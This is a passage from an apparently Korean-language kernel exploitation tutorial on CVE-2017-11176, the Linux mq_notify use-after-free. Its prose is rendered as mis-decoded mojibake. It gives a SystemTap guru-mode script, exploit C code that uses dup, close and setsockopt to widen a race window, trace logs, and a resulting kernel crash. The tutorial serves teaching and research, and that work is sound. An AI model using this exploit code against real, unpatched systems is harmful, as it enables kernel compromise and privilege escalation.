ì´ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ mq\_notifyê°€ blockí•˜ê¸° ì „ì— "setsockopt()"ê°€ í˜¸ì¶œë˜ê¸° ë•Œë¬¸ì— ë©”ì¸ ìŠ¤ë ˆë“œë¥¼ unblockí•´ì£¼ì§€ **ì•Šì„ ê²ƒ**ì´ë‹¤. ì´ê²ƒì´ ë©”ì¸ ìŠ¤ë ˆë“œë¥¼ unblockí•œ ì´í›„ **sleep(5)**ê°€ ìˆë˜ ì´ìœ ì´ë‹¤('is\_ready'ëŠ” trueì´ë‹¤).  ë‹¤ì‹œ ë§í•´ "ê·¸ì €" mq\_notify()ë¥¼ í˜¸ì¶œí•˜ëŠ” ë° ì ì–´ë„ 5ì´ˆê°€ ê±¸ë¦°ë‹¤ëŠ” ê²ƒì´ë‹¤. "5ì´ˆ"ê°€ ì¶©ë¶„í•˜ë‹¤ëŠ” ê²ƒì„ ë‹¤ìŒê³¼ ê°™ì€ ì´ìœ ë¡œ ë¯¿ì„ ìˆ˜ ìˆë‹¤:

* ë©”ì¸ ìŠ¤ë ˆë“œê°€ 5ì´ˆ ë’¤ì—ë„ ìˆœì„œì—ì„œ ë°€ë ¤(preempted) ìˆë‹¤ë©´ íƒ€ê²Ÿ ì‹œìŠ¤í…œì— ë¶€í•˜ê°€ ì‹¬í•˜ê²Œ ê±¸ë ¤ìˆëŠ” ê²ƒì´ë¯€ë¡œ ì–´ì°¨í”¼ ìµìŠ¤í”Œë¡œì‡ì„ ì‹¤í–‰í•˜ë©´ ì•ˆ ëœë‹¤.
* ë§Œì•½ unblock\_threadê°€ ë©”ì¸ ìŠ¤ë ˆë“œì™€ "ê²½í•©"(race)í•˜ë©´ CTRL+C ëª…ë ¹ì–´ë¥¼ ì´ìš©í•  ìˆ˜ ìˆë‹¤. ê·¸ëŸ¬ë©´ netlink\_attachskb()ê°€ "-ERESTARTSYS"ë¥¼ ë°˜í™˜í•˜ê³  ê·¸ ê²½ë¡œì—ì„  ë²„ê·¸ê°€ íŠ¸ë¦¬ê±°ë˜ì§€ ì•ŠëŠ”ë‹¤. ê·¸ëŸ¼ ìµìŠ¤í”Œë¡œì‡ì„ ì¬ì‹¤í–‰í•˜ë©´ ëœë‹¤.

ë‹¤ì‹œ ë§í•´ "ì œì–´ë˜ëŠ” ê¸°íšŒ"ì˜ ì‹œê°„ì€ ì´ì œ 5ì´ˆì´ë‹¤. ë©”ì¸ ìŠ¤ë ˆë“œê°€ ì‹¤í–‰ ì¤‘ì´ ì•„ë‹ˆê¸° ë•Œë¬¸ì— ë‹¤ë¥¸ ìŠ¤ë ˆë“œë¥¼ ê¹¨ìš¸ ìˆ˜ ì—†ë‹¤ëŠ” ì ì´ ë§ˆìŒì— ë“¤ì§€ ì•Šì„ ìˆ˜ ìˆë‹¤(Core Concepts #2 ì°¸ê³ ). unblock\_threadê°€ ëª¨ì¢…ì˜ ë°©ë²•ìœ¼ë¡œ ì •ë³´ë¥¼ ì–»ì–´ë‚´ëŠ” ê²ƒì¼ê¹Œ? ë­...ì—¬ê¸°ì„  sleep(5)ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒìœ¼ë¡œ ì¶©ë¶„í•˜ë‹¤ğŸ˜Š.

## <a name='updating-the-stap-script'></a>Updating the STAP Script

ìµìŠ¤í”Œë¡œì‡ì„ ì‹¤í–‰í•˜ê¸° ì „ì— stap ìŠ¤í¬ë¦½íŠ¸ë¥¼ ìˆ˜ì •í•´ì•¼ í•œë‹¤. ì´ì œ netlink\_attachskb()ë¥¼ í˜¸ì¶œí•˜ê¸° **ì „ì—** netlink\_socket (fd=3)ì„ ì œê±°í•œë‹¤. ì´ëŠ” setsockopt()ë¥¼ netlink\_attachskb() ì§„ì… í›„ì— í˜¸ì¶œí•˜ë©´ file descriptor *sock\_fd* ê°€ ì¸ì‹ ë¶ˆê°€ëŠ¥(invalid)í•´ì§ˆ ê²ƒì´ê¸° ë•Œë¬¸ì´ë‹¤(FDTì˜ NULLì„ ê°€ë¦¬í‚¨ë‹¤). ì¦‰ setsockopt()ê°€ "Bad File Descriptor" ì—ëŸ¬ë¡œ ì‹¤íŒ¨í•  ê²ƒì´ë‹¤(= *netlink\_setsockopt()* ì—” ë„ë‹¬ì¡°ì°¨ ëª»í•¨).

ê·¸ëŸ¬ë¯€ë¡œ netlink\_attachskb() ì´ì „ì´ ì•„ë‹Œ ë¦¬í„´í•  ë•Œ fd "3"ì„ ì œê±°í•˜ì:

```stap
# mq_notify_force_crash.stp
#
# Run it with "stap -v -g ./mq_notify_force_crash.stp" (guru mode)

%{
#include <net/sock.h>
#include <net/netlink_sock.h>
#include <linux/fdtable.h>
%}

function force_trigger_before:long (arg_sock:long)
%{
  struct sock *sk = (void*) STAP_ARG_arg_sock;
  struct netlink_sock *nlk = (void*) sk;
  nlk->state |= 1;   // enter the netlink_attachskb() retry path    

  // NOTE: We do not mark the sock as DEAD anymore
%}

function force_trigger_after:long (arg_sock:long)
%{
  struct files_struct *files = current->files;
  struct fdtable *fdt = files_fdtable(files);
  fdt->fd[3] = NULL; // makes the second call to fget() fails
%}


probe kernel.function ("netlink_attachskb")
{
  if (execname() == "exploit")
  {
    force_trigger_before($sk);
  }
}

probe kernel.function ("netlink_attachskb").return
{
  if (execname() == "exploit")
  {
    force_trigger_after(0);
  }
}
```

ëŠ˜ ê·¸ë¬ë˜ ê²ƒì²˜ëŸ¼ probeë¥¼ ì¢€ ë” ì¶”ê°€í•˜ì—¬ ì½”ë“œ íë¦„ì„ ë³¼ ìˆ˜ ìˆë„ë¡ í•˜ì. ê·¸ëŸ¼ ë‹¤ìŒê³¼ ê°™ì€ ê²°ê³¼ë¥¼ ì–»ëŠ”ë‹¤:

```bash
$ ./exploit 
-={ CVE-2017-11176 Exploit }=-
netlink socket created = 3
creating unblock thread...
unblocking thread has been created!
get ready to block

<<< we get stuck here during ~5secs >>>

[unblock] unblocking now
mq_notify: Bad file descriptor
exploit failed!

(15981-15981) [SYSCALL] ==>> mq_notify (-1, 0x7fffbd130e30)
(15981-15981) [uland] ==>> copy_from_user ()
(15981-15981) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
(15981-15981) [uland] ==>> copy_from_user ()
(15981-15981) [skb] ==>> skb_put (skb=0xffff8800302551c0 len=0x20)
(15981-15981) [skb] <<== skb_put = ffff88000a015600
(15981-15981) [vfs] ==>> fget (fd=0x3)
(15981-15981) [vfs] <<== fget = ffff8800314869c0
(15981-15981) [netlink] ==>> netlink_getsockbyfilp (filp=0xffff8800314869c0)
(15981-15981) [netlink] <<== netlink_getsockbyfilp = ffff8800300ef800
(15981-15981) [netlink] ==>> netlink_attachskb (sk=0xffff8800300ef800 skb=0xffff8800302551c0 timeo=0xffff88000b157f40 ssk=0x0)
(15981-15981) [sched] ==>> schedule_timeout (timeout=0x7fffffffffffffff)
(15981-15981) [sched] ==>> schedule ()
(15981-15981) [sched] ==>> deactivate_task (rq=0xffff880003c1f3c0 p=0xffff880031512200 flags=0x1)
(15981-15981) [sched] <<== deactivate_task = 

<<< we get stuck here during ~5secs >>>

(15981-15981) [sched] <<== schedule = 
(15981-15981) [sched] <<== schedule_timeout = 7fffffffffffffff
(15981-15981) [netlink] <<== netlink_attachskb = 1              // <----- returned 1
(15981-15981) [vfs] ==>> fget (fd=0x3)
(15981-15981) [vfs] <<== fget = 0                               // <----- returned 0
(15981-15981) [netlink] ==>> netlink_detachskb (sk=0xffff8800300ef800 skb=0xffff8800302551c0)
(15981-15981) [netlink] <<== netlink_detachskb
(15981-15981) [SYSCALL] <<== mq_notify= -9
```

**ë…¸íŠ¸**: ë‹¤ë¥¸ ìŠ¤ë ˆë“œì˜ traceëŠ” ê²°ê³¼ë¥¼ ëª…í™•íˆ ë³´ì—¬ì£¼ê¸° ìœ„í•´ ì œê±°ë˜ì—ˆë‹¤.

ì™„ë²½í•˜ë‹¤! ë©”ì¸ ìŠ¤ë ˆë“œê°€ netlink\_attachskb() ì•ˆì—ì„œ 5ì´ˆê°„ ë©ˆì¶° ìˆì—ˆê³ , ë‹¤ë¥¸ ìŠ¤ë ˆë“œë¥¼ í†µí•´ unblockí•˜ì˜€ë”ë‹ˆ (ì˜ˆìƒëŒ€ë¡œ) 1ì„ ë°˜í™˜í–ˆë‹¤!

ì´ë²ˆ ì„¹ì…˜ì—ì„œ ì–´ë–»ê²Œ raceë¥¼ ì œì–´í•˜ê³  ê¸°íšŒë¥¼ ë¬´í•œì • í™•ì¥í•˜ëŠ”ì§€(ìš°ë¦¬ëŠ” 5ì´ˆë¡œ ì¤„ì˜€ë‹¤) ë³´ì•˜ë‹¤. ê·¸ë¦¬ê³  setsockopt()ë¥¼ ì´ìš©í•˜ì—¬ ë©”ì¸ ìŠ¤ë ˆë“œë¥¼ ê¹¨ìš°ëŠ” ë²•ì„ ë³´ì•˜ë‹¤. ë˜í•œ ìµìŠ¤í”Œë¡œì‡ì—ì„œ ë°œìƒí•  ìˆ˜ ìˆëŠ” "race"ì— ëŒ€í•´ ë‹¤ë£¨ê³  ê°„ë‹¨í•œ ë°©ë²•ìœ¼ë¡œ ë°œìƒ ê°€ëŠ¥ì„±ì„ ì¤„ì´ëŠ” ë°©ë²•ì„ ë³´ì•˜ë‹¤. ë§ˆì§€ë§‰ìœ¼ë¡œ, ìœ ì € ì˜ì—­ì˜ ì½”ë“œë§Œ ì´ìš©í•˜ì—¬ stap ìŠ¤í¬ë¦½íŠ¸ë¡œ í•´ê²°í–ˆë˜ ìš”êµ¬ ì¡°ê±´(SOCKì„ deadë¡œ ë§ˆí‚¹í•˜ëŠ” ê²ƒ) ì¤‘ í•˜ë‚˜ë¥¼ ì œê±°í–ˆë‹¤. ì•„ì§ ë‘ ìš”êµ¬ ì¡°ê±´ì„ ë” êµ¬í˜„í•´ì•¼ í•œë‹¤.

- - -

# <a name='making-fget-fail-on-second-loop'></a>Making *fget()* Fail on Second Loop

ì§€ê¸ˆê¹Œì§€ ì„¸ ê°€ì§€ ìš”êµ¬ ì¡°ê±´ ì¤‘ í•˜ë‚˜ë¥¼ ìœ ì € ì˜ì—­ì—ì„œ êµ¬í˜„í–ˆë‹¤. ì•ìœ¼ë¡œ í•  ì¼ë“¤ì˜ ëª©ë¡ì´ë‹¤:

1. **netlink\_attachskb()ê°€ 1ì„ ë°˜í™˜í•˜ê²Œ ë§Œë“¤ê¸°**
2. [í•´ê²°] ìµìŠ¤í”Œë¡œì‡ ìŠ¤ë ˆë“œ unblockí•˜ê¸°
3. **ë‘ ë²ˆì§¸ fget() í˜¸ì¶œì´ NULLì„ ë°˜í™˜í•˜ê²Œ ë§Œë“¤ê¸°**

ì´ë²ˆ ì„¹ì…˜ì—ì„œ ë‘ ë²ˆì§¸ fget() í˜¸ì¶œì´ NULLì„ ë°˜í™˜í•˜ê²Œ ë§Œë“¤ ê²ƒì´ë‹¤. ê·¸ë ‡ê²Œ í•˜ë©´ ë‘ ë²ˆì§¸ ë£¨í”„ì—ì„œ "exit path"ë¡œ ì§„ì…í•  ìˆ˜ ìˆë‹¤:

```c
retry:
            filp = fget(notification.sigev_signo);
            if (!filp) {
                ret = -EBADF;
                goto out;           // <--------- on the second loop only!
            }
```

## ì™œ fget()ì´ NULLì„ ë°˜í™˜í• ê¹Œ?

System Tapì„ í†µí•´ FDTì— ìˆëŠ” ìš°ë¦¬ì˜ íƒ€ê²Ÿ file descriptorì˜ í•­ëª©ì„ ë¦¬ì…‹í•˜ëŠ” ê²ƒë§Œìœ¼ë¡œ fget()ì´ ì‹¤íŒ¨í•˜ë„ë¡(= NULLì„ ë°˜í™˜í•˜ë„ë¡) ë§Œë“¤ ìˆ˜ ìˆë‹¤ëŠ” ê±¸ ë³´ì•˜ë‹¤:

```stap
struct files_struct *files = current->files;
struct fdtable *fdt = files_fdtable(files);
fdt->fd[3] = NULL; // makes the second call to fget() fails
```

**fget()**ì€ ë‹¤ìŒ ì¼ë“¤ì„ í•œë‹¤:

1. *í˜„ì¬* í”„ë¡œì„¸ìŠ¤ì˜ "struct files\_struct"ë¥¼ ì–»ëŠ”ë‹¤.
2. files\_structì˜ "struct fdtable"ë¥¼ ì–»ëŠ”ë‹¤.
3. "fdt->fd[fd]" ("struct file" í¬ì¸í„°) ê°’ì„ ì–»ëŠ”ë‹¤.
4. "struct file"ì˜ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ë¥¼ (NULLì´ ì•„ë‹ˆë¼ë©´) 1 ì¦ê°€ì‹œí‚¨ë‹¤.
5. "struct file" í¬ì¸í„°ë¥¼ ë°˜í™˜í•œë‹¤.

ìš”ì•½í•˜ë©´ íŠ¹ì • file descriptorì— ëŒ€í•œ FDT í•­ëª©ì´ NULLì´ë©´ fget()ì´ NULLì„ ë°˜í™˜í•œë‹¤.

**ë…¸íŠ¸**: ì—¬ê¸°ì„œ ì–¸ê¸‰ëœ êµ¬ì¡°ì²´ë“¤ ì‚¬ì´ì˜ ê´€ê³„ê°€ ê¸°ì–µì´ ì•ˆ ë‚œë‹¤ë©´ [í•µì‹¬ ê°œë… #1](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#core-concepts)ë¥¼ ë‹¤ì‹œ ë³´ê³  ì˜¤ì.

## Reset an Entry in the File Descriptor Table

stap ìŠ¤í¬ë¦½íŠ¸ì—ì„œ file descriptorì— ëŒ€í•œ fdt í•­ëª©ì„ "3"ìœ¼ë¡œ ì¬ì„¤ì •í–ˆì—ˆë‹¤(ì´ì „ ì„¹ì…˜ ì°¸ê³ ). ìœ ì € ì˜ì—­ì—ì„  ì–´ë–»ê²Œ í•´ì•¼ ë ê¹Œ? FDT í•­ëª©ì„ NULLë¡œ ì„¤ì •í•´ì£¼ëŠ” ê²ƒì€ ë¬´ì—‡ì¸ê°€? **ì •ë‹µì€ close() syscallì´ë‹¤.**

ë‹¤ìŒì€ lockingê³¼ error handlingì´ ì—†ëŠ” ë‹¨ìˆœí™”ëœ ë²„ì „ì´ë‹¤:

```c
    // [fs/open.c]

    SYSCALL_DEFINE1(close, unsigned int, fd)
    {
      struct file * filp;
      struct files_struct *files = current->files;
      struct fdtable *fdt;
      int retval;

[0]   fdt = files_fdtable(files);
[1]   filp = fdt->fd[fd];
[2]   rcu_assign_pointer(fdt->fd[fd], NULL); // <----- equivalent to: fdt->fd[fd] = NULL
[3]   retval = filp_close(filp, files);
      return retval;
    }
```

close() syscallì€ ë‹¤ìŒê³¼ ê°™ì€ ì¼ì„ í•œë‹¤:

* [0] - í˜„ì¬ í”„ë¡œì„¸ìŠ¤ì˜ FDTë¥¼ ì–»ëŠ”ë‹¤
* [1] - FDTë¥¼ ì´ìš©í•˜ì—¬ fdì™€ ì—°ê´€ëœ struct fileì˜ í¬ì¸í„°ë¥¼ ì–»ëŠ”ë‹¤
* [2] - **(ë¬´ì¡°ê±´ì ìœ¼ë¡œ) FDT í•­ëª©ì„ NULLë¡œ ì¬ì„¤ì •í•œë‹¤**
* [3] - file objectì— ëŒ€í•œ ì°¸ì¡°ë¥¼ í•´ì œí•œë‹¤(= fput() í˜¸ì¶œ)

ê·¸ëŸ¼ ì´ì œ (ë¬´ì¡°ê±´ì ìœ¼ë¡œ) FDT í•­ëª©ì„ ì¬ì„¤ì •í•  ë°©ë²•ì´ ìƒê²¼ë‹¤. ê·¸ëŸ°ë° ì´ë ‡ê²Œ í•˜ë©´ ë‹¤ë¥¸ ë¬¸ì œê°€ ìƒê¸´ë‹¤

## An Egg and Chicken Issue...

*ê·¸ëƒ¥* *unblock\_thread* ì—ì„œ setsockopt() í˜¸ì¶œ ì „ì— close()ë¥¼ í˜¸ì¶œí•˜ë©´ ì•ˆ ë˜ë‚˜? ë¬¸ì œëŠ” setsockopt()ì— ìœ íš¨í•œ file descriptorê°€ í•„ìš”í•˜ë‹¤ëŠ” ê²ƒì´ë‹¤. ìš°ë¦° ê·¸ê±¸ system tapì„ í†µí•´ [ì´ë¯¸ ê²½í—˜](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196#updating-the-stap-script)í–ˆê³ , ê·¸ë•Œë¬¸ì— "fdt reset code"ë¥¼ netlink\_attachskb()ê°€ ë¦¬í„´(í•˜ê¸° ì „ì´ ì•„ë‹ˆê³ )í•  ë•Œ ì˜®ê²¼ë‹¤. ìœ ì € ì˜ì—­ì—ì„œë„ ë™ì¼í•œ ë¬¸ì œê°€ ìˆë‹¤.

setsockopt() (ìŠ¤ë ˆë“œ unblock) *ì´í›„ì—* close()ë¥¼ í˜¸ì¶œí•˜ë©´ ì–´ë–¨ê¹Œ? ê·¸ë ‡ê²Œ í•˜ë©´ **í¬ê²Œ ë§Œë“  ê¸°íšŒë¥¼ ì´ìš©í•  ìˆ˜ê°€ ì—†ë‹¤**. ë‹¤ì‹œ ë§í•´ "ì‘ì€ ê¸°íšŒ"ë¡œ ë‹¤ì‹œ ëŒì•„ê°„ë‹¤. ê·¸ëŸ´ ìˆ˜ëŠ” ì—†ë‹¤.

ë‹¤í–‰íˆë„ ë°©ë²•ì´ ì¡´ì¬í•œë‹¤! [í•µì‹¬ ê°œë… #1](https://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca#core-concepts)ì—ì„œ file descriptor tableì´ **1ëŒ€1 ë§¤í•‘ì´ ì•„ë‹ˆ**ë¼ê³  í–ˆì—ˆë‹¤. ì¦‰ ì—¬ëŸ¬ file descriptorê°€ í•œ file ì˜¤ë¸Œì íŠ¸ë¥¼ ê°€ë¦¬í‚¤ê³  ìˆì„ ìˆ˜ ìˆë‹¤ëŠ” ëœ»ì´ë‹¤. ë‘ file descriptor í•œ struct fileì„ ê°€ë¦¬í‚¤ê²Œ í•˜ë ¤ë©´ ì–´ë–»ê²Œ í•´ì•¼ í• ê¹Œ? **dup() syscall**ì„ ì´ìš©í•˜ëŠ” ê²ƒì´ë‹¤.

```c
    // [fs/fcntl.c]

    SYSCALL_DEFINE1(dup, unsigned int, fildes)
    {
      int ret = -EBADF;
[0]   struct file *file = fget(fildes);

      if (file) {
[1]     ret = get_unused_fd();
        if (ret >= 0)
[2]       fd_install(ret, file); // <----- equivalent to: current->files->fdt->fd[ret] = file
        else
          fput(file);
      }
[3]   return ret;
    }
```

dup() syscallì€ ì •í™•íˆ ìš°ë¦¬ê°€ ì›í•˜ëŠ” ê²ƒì„ í•´ì¤€ë‹¤:

* [0] - file descriptorê°€ struct file ì˜¤ë¸Œì íŠ¸ë¥¼ ì°¸ì¡°í•œë‹¤.
* [1] - ë‹¤ìŒ "ì“°ì´ì§€ ì•Šì€/ì‚¬ìš© ê°€ëŠ¥í•œ" file descriptorë¥¼ ê³ ë¥¸ë‹¤.
* [2] - ì´ ìƒˆë¡œìš´ file descriptorì˜ fdt í•­ëª©ì„ struct file ì˜¤ë¸Œì íŠ¸ì— ëŒ€í•œ í¬ì¸í„°ë¡œ ì„¤ì •í•œë‹¤.
* [3] - ìƒˆ fdë¥¼ ë°˜í™˜í•œë‹¤.

ê²°êµ­ ë™ì¼í•œ struct fileì„ ê°€ë¦¬í‚¤ëŠ” ë‘ file descriptorê°€ ìƒê¸°ê²Œ ëœë‹¤:

* **sock\_fd**: mq\_notify()ì™€ close()ì— ì˜í•´ ì‚¬ìš©ë¨
* **unblock\_fd**: setsockopt()ì— ì˜í•´ ì‚¬ìš©ë¨

## Updating the Exploit

close/dup í˜¸ì¶œì„ ì¶”ê°€í•˜ê³  setsockopt()ì˜ íŒŒë¼ë¯¸í„°ë¥¼ ë°”ê¿” ìµìŠ¤í”Œë¡œì‡ì„ ì—…ë°ì´íŠ¸í•´ë³´ì:

```c
struct unblock_thread_arg
{
  int sock_fd;
  int unblock_fd;     // <----- used by the "unblock_thread"
  bool is_ready;
};

static void* unblock_thread(void *arg)
{
  // ... cut ...

  sleep(5); // gives some time for the main thread to block

  printf("[unblock] closing %d fd\n", uta->sock_fd);
  _close(uta->sock_fd);                               // <----- close() before setsockopt()

  printf("[unblock] unblocking now\n");
  if (_setsockopt(uta->unblock_fd, SOL_NETLINK,       // <----- use "unblock_fd" now!
                  NETLINK_NO_ENOBUFS, &val, sizeof(val)))
    perror("setsockopt");
  return NULL;
}

int main(void)
{
  // ... cut ...

  if ((uta.unblock_fd = _dup(uta.sock_fd)) < 0)         // <----- dup() after socket() 
  {
    perror("dup");
    goto fail;
  }
  printf("[main] netlink fd duplicated = %d\n", uta.unblock_fd);

  // ... cut ...
}
```

stap ìŠ¤í¬ë¦½íŠ¸ì—ì„œ FDT ì¬ì„¤ì •í•˜ëŠ” ë¶€ë¶„ì„ ì—†ì• ê³  ì‹¤í–‰í•´ë³´ì:

```plaintext
-={ CVE-2017-11176 Exploit }=-
[main] netlink socket created = 3
[main] netlink fd duplicated = 4
[main] creating unblock thread...
[main] unblocking thread has been created!
[main] get ready to block
[unblock] closing 3 fd
[unblock] unblocking now
mq_notify: Bad file descriptor
exploit failed!

<<< KERNEL CRASH >>>
```

**ALERT COBRA(?): ì²« ì»¤ë„ í¬ë˜ì‹œê°€ ë°œìƒí–ˆë‹¤! use-after-treeë¥¼ íŠ¸ë¦¬ê±°í•œ ê²ƒì´ë‹¤.**

í¬ë˜ì‹œì˜ ì´ìœ ëŠ” [part 3](https://chamalane.herokuapp.com/posts/5d503601c040080004228197)ì—ì„œ ë°°ìš¸ ê²ƒì´ë‹¤.

*ê°„ë‹¨íˆ ìš”ì•½í•˜ìë©´ ë‹¤ìŒê³¼ ê°™ë‹¤. dup() ë•Œë¬¸ì— close()ë¥¼ í˜¸ì¶œí•´ë„ netlink\_sock ì˜¤ë¸Œì íŠ¸ì— ëŒ€í•œ ì°¸ì¡°ê°€ í•´ì œë˜ì§€ ì•Šì„ ê²ƒì´ë‹¤. netlink\_sockì— ë§ˆì§€ë§‰ìœ¼ë¡œ í•œ ì°¸ì¡°ëŠ” ì‚¬ì‹¤ netlink\_detachskb()ì—ì„œ í•´ì œëœë‹¤(ê·¸ë¦¬ê³  netlink\_sockì€ freeëœë‹¤). ê²°êµ­ use-after-freeëŠ” í”„ë¡œê·¸ë¨ì´ ì¢…ë£Œë  ë•Œ "unblock\_fd" file descriptorë¥¼ (netlink\_release()ë¥¼ í†µí•´) í•´ì œí•˜ë©° íŠ¸ë¦¬ê±°ëœë‹¤.*

ì¢‹ë‹¤! ë²Œì¨ ì¡°ê±´ ë‘˜ì„ System Tap **ì—†ì´** í•´ê²°í–ˆë‹¤. ê·¸ëŸ¼ ë‹¤ìŒìœ¼ë¡œ ë„˜ì–´ê°€ì„œ ë§ˆì§€ë§‰ ì¡°ê±´ì„ êµ¬í˜„í•´ë³´ì.

- - -

# <a name='looping-back-to-retry-label'></a>"retry" labelë¡œ ëŒì•„ê°€ê¸°

ì´ ì„¹ì…˜ì€ *ë”ì°í•œ* ì»¤ë„ ì½”ë“œ ì‚´í´ë³´ê¸°ì²˜ëŸ¼ ë³´ì¼ ìˆ˜ ìˆë‹¤. ê²ë¨¹ì§€ ë§ì! ì™„ì „í•œ proof-of-concept ì½”ë“œê¹Œì§€ í•œ ê±¸ìŒ ë‚¨ì•˜ë‹¤. "*ì‡ ë¿”ë„ ë‹¨ê¹€ì— ë¹¼ë¼*" ëŠ” ë§ì´ ìˆë‹¤.

ê·¸ëŸ¼ ì´ì œ í•  ì¼ ëª©ë¡ì„ ë³´ì:

1. **netlink\_attachskb()ê°€ 1ì„ ë°˜í™˜í•˜ê²Œ ë§Œë“¤ê¸°**
2. [í•´ê²°] ìµìŠ¤í”Œë¡œì‡ ìŠ¤ë ˆë“œ unblockí•˜ê¸°
3. [í•´ê²°] ë‘ ë²ˆì§¸ fget() í˜¸ì¶œì´ NULLì„ ë°˜í™˜í•˜ê²Œ ë§Œë“¤ê¸°

**retry path**ì— ë„ë‹¬í•˜ë ¤ë©´ **netlink\_attachskb()**ê°€ 1ì„ ë°˜í™˜í•´ì•¼ í•œë‹¤. ê·¸ë ‡ê²Œ í•˜ë ¤ë©´ ì²« ë²ˆì§¸ ì¡°ê±´ì„ í†µê³¼í•˜ê³  ìŠ¤ë ˆë“œë¥¼ unblockí•´ì•¼ í•œë‹¤(ì´ë¯¸ í–ˆë‹¤(?)).

```c
    int netlink_attachskb(struct sock *sk, struct sk_buff *skb,
              long *timeo, struct sock *ssk)
    {
      struct netlink_sock *nlk;
      nlk = nlk_sk(sk);

[0]   if (atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state))
      {
        // ... cut ...
        return 1;
      }
      // normal path
      return 0;
    }
```

ì¡°ê±´ [0]ì€ ë‹¤ìŒ ê²½ìš°ì— trueì´ë‹¤:

1. **sk\_rmem\_alloc** ê°’ì´ **sk\_rcvbuf** ë³´ë‹¤ *í° ê²½ìš°*. í˜¹ì€...
2. ...**nlk->state**ì˜ ìµœí•˜ìœ„ ë¹„íŠ¸ê°€ ì„¤ì •ë˜ì–´ ìˆëŠ” ê²½ìš°

ì§€ê¸ˆì€ stapì„ ì´ìš©í•˜ì—¬ "nlk->state"ì˜ ìµœí•˜ìœ„ ë¹„íŠ¸ë¥¼ ì„¤ì •í•´ì£¼ê³  ìˆë‹¤:

```stap
struct sock *sk = (void*) STAP_ARG_arg_sock;
struct netlink_sock *nlk = (void*) sk;
nlk->state |= 1;    
```

ê·¸ëŸ¬ë‚˜ ì†Œì¼“ ìƒíƒœë¥¼ "congested"(ìµœí•˜ìœ„ ë¹„íŠ¸ê°€ ì„¤ì •ëœ ê²ƒ)í•˜ë‹¤ê³  í•´ë†“ëŠ” ê²ƒì€ ì•½ê°„ ì‹œì‹œí•˜ë‹¤. ìµœí•˜ìœ„ ë¹„íŠ¸ë¥¼ ì„¤ì •í•´ì£¼ëŠ” ì»¤ë„ ê²½ë¡œëŠ” ë©”ëª¨ë¦¬ í• ë‹¹ ì‹¤íŒ¨ë¡œë§Œ ë„ë‹¬í•  ìˆ˜ ìˆë‹¤. ê·¸ë ‡ê²Œ ë˜ë©´ ì‹œìŠ¤í…œì´ ë¶ˆì•ˆì •í•œ ìƒíƒœê°€ ë˜ì–´ ìµìŠ¤í”Œë¡œì‡ì„ í•˜ê¸°ì— ì í•©í•˜ì§€ ì•Šê²Œ ëœë‹¤. ë¬¼ë¡  (ë©”ëª¨ë¦¬ ì‹¤íŒ¨ê°€ ì—†ëŠ”) ë‹¤ë¥¸ ê²½ë¡œê°€ ìˆì§€ë§Œ ì´ë¯¸ ë§Œì¡±ì‹œí‚¨ ì¡°ê±´ì´ ì“¸ëª¨ê°€ ì—†ì–´ì ¸ë²„ë¦°ë‹¤.

ê·¸ ëŒ€ì‹ ì— sockì˜ receive bufferì˜ "í˜„ì¬" í¬ê¸°ë¥¼ ë‚˜íƒ€ë‚´ëŠ” **sk\_rmem\_alloc** ê°’ì„ ì¦ê°€ì‹œì¼œë³¼ ê²ƒì´ë‹¤.

## Filling The Receive Buffer

ì´ë²ˆ ì„¹ì…˜ì—ì„œ ë§Œì¡±ì‹œí‚¤ë ¤ëŠ” ì¡°ê±´ì€ "receive bufferê°€ ê½‰ ì°¼ëŠ”ê°€?"ì™€ ê°™ë‹¤:

```
atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf
```

struct sock(netlink\_sockì— ë‚´ì¥ë¨)ì´ ë‹¤ìŒ ë„¤ ê°€ì§€ í•„ë“œë¥¼ ê°€ì§€ê³  ìˆì—ˆë˜ ê²ƒì„ ìƒê¸°í•´ë³´ì:

* **sk\_rcvbuf**: receive bufferì˜ "ì´ë¡ ì ì¸" ìµœëŒ€ í¬ê¸° (byte ë‹¨ìœ„)
* **sk\_rmem\_alloc**: receive bufferì˜ "í˜„ì¬" í¬ê¸° (byte ë‹¨ìœ„)
* **sk\_receive\_queue**: "skb"ì˜ ì´ì¤‘ ì—°ê²° ë¦¬ìŠ¤íŠ¸(= ë„¤íŠ¸ì›Œí¬ ë²„í¼)

**ë…¸íŠ¸**: sk\_rcvbufëŠ” "ì´ë¡ ì ì¸" í¬ê¸°ì¸ë°, ê·¸ê²ƒì€ receive bufferì˜ "í˜„ì¬" í¬ê¸°ê°€ sk\_rcvbufë¥¼ ë„˜ì„ ìˆ˜ ìˆê¸° ë•Œë¬¸ì´ë‹¤.

stapìœ¼ë¡œ netlink sock êµ¬ì¡°ì²´ë¥¼ ë¤í”„í•  ë•Œ ([part 1](http://chamalane.herokuapp.com/posts/5d4ef9fb907a8600042c4cca)) ë‹¤ìŒ ë‚´ìš©ì´ ìˆì—ˆë‹¤:

```plaintext
- sk->sk_rmem_alloc = 0
- sk->sk_rcvbuf = 133120
```

ì´ ì¡°ê±´ì„ ë§Œì¡±ì‹œí‚¤ëŠ” ë°©ë²•ì´ ë‘ ê°€ì§€ ìˆë‹¤:

1. sk\_rcvbufë¥¼ 0ë³´ë‹¤ ì‘ê²Œ ë§Œë“ ë‹¤. (ìš°ë¦¬ ì»¤ë„ ë²„ì „ì—ì„œ sk\_rcvbufì˜ íƒ€ì…ì€ *int*ì´ë‹¤)
2. sk\_rmem\_allocì„ 133120ë³´ë‹¤ í¬ê²Œ ë§Œë“ ë‹¤.

## Lowering sk\_rcvbuf

*sk\_rcvbuf*ëŠ” ëª¨ë“  sock ì˜¤ë¸Œì íŠ¸ì—ì„œ ì¼ë°˜ì ì¸ ê²ƒì´ë‹¤. ì´ ê°’ì´ (netlink socketë“¤ê³¼) ë³€í•˜ëŠ” ê³³ì€ ë§ì§€ ì•Šë‹¤. ê·¸ ì¤‘ í•˜ë‚˜ê°€ (SOL\_SOCKET íŒŒë¼ë¯¸í„°ë¡œ ì ‘ê·¼ ê°€ëŠ¥í•œ) **sock\_setsockopt**ì´ë‹¤:

```c
    // from [net/core/sock.c]

